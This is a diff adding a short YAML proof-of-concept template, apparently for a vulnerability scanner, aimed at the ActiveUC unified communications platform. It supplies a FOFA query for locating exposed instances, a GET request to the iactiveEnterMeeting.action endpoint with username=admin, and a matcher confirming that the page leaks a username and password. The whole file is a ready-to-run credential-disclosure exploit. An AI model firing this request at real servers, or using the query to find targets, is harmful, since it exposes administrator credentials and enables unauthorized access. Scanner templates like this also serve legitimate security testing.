@@ -1,0 +1,16 @@
+id: poc-yaml-active-iactiveentermeeting-info-leak
+info:
+  name: 网动统一通信平台ActiveUC iactiveEnterMeeting 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 网动统一通信平台
+  fofa: title="网动统一通信平台(Active UC)"
+requests:
+- method: GET
+  path: /acenter/iactiveEnterMeeting.action?roomid=1&username=admin
+  expression: "status_code == 200 && \ncontains(body,\"var username=\") &&\ncontains(body,\"\
+    var password=\") &&\ncontains(body,\"ActiveMeeting.exe\") &&\ncontains(title,\"\
+    登陆会议\")\n"
+variables: {}
+transport: http
